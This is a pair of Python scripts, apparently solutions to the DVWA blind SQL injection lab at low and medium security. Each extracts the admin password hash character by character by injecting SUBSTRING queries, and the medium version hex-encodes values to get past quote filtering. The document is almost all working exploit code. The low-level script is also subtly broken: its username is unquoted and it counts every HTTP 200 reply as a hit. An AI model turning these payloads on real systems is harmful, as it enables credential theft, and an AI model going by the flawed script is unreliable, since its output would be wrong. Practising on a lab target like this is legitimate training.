```python
import requests
import string

URL = 'http://10.0.2.15/vulnerabilities/sqli_blind/'
PASSWORD_LENGTH = 32
CHARSET = string.ascii_lowercase + string.digits
TARGET_USER = 'admin'

password = ''

headers = {
    "Cookie": "PHPSESSID=6jnnm1vkco0knlf0qkcesvlt14; security=low"
}

for i in range(1, PASSWORD_LENGTH+1):
    for c in CHARSET:
        PAYLOAD = {
            "id": f"1' AND SUBSTRING((SELECT password FROM users WHERE user= {TARGET_USER}),{i},1)='{c}' -- -",
            "Submit": "Submit"
        }

        response = requests.get(URL, params=PAYLOAD, headers=headers)

        if response.status_code == 200:
            password += c
            print(f"[+] Found char {i}: {c} | Password so far: {password}")
            break
    else:
        print(f"[-] Could not find character at position {i}")
        break

print(f"\n[*] Recovered password: {password}")
```

# DVWA Blind SQLi - Medium

```python
import requests
import string

# Config
URL = "http://10.0.2.15/vulnerabilities/sqli_blind/"
COOKIES = {
    "PHPSESSID": "a0jk2gqhkjgt1982om82qsbop5",
    "security": "medium"
}
HEADERS = {"Content-Type": "application/x-www-form-urlencoded"}
TARGET_USER = "admin"
PASSWORD_LENGTH = 32
CHARSET = string.ascii_lowercase + string.digits

password = ''


def to_hex(s):
    """Convert string to MySQL hex literal (e.g. 'admin' -> 0x61646d696e)"""
    return "0x" + s.encode().hex()


for i in range(1, PASSWORD_LENGTH+1):
    for c in CHARSET:
        PAYLOAD = {
            "id": f"1 and SUBSTRING((SELECT password FROM users WHERE user={to_hex(TARGET_USER)}),{i},1) = {to_hex(c)}-- -",
            "Submit": "Submit"
        }

        response = requests.post(
            URL,
            headers=HEADERS,
            cookies=COOKIES,
            data=PAYLOAD
        )
        if ('User ID exists in the database.' in response.text):
            password += c
            print(f"[+] Found char {i}: {c} | Password so far: {password}")
            break

    else:
        print(f"[-] Could not find character at position {i}")
        break

print(f"\n[*] Recovered password: {password}")
```
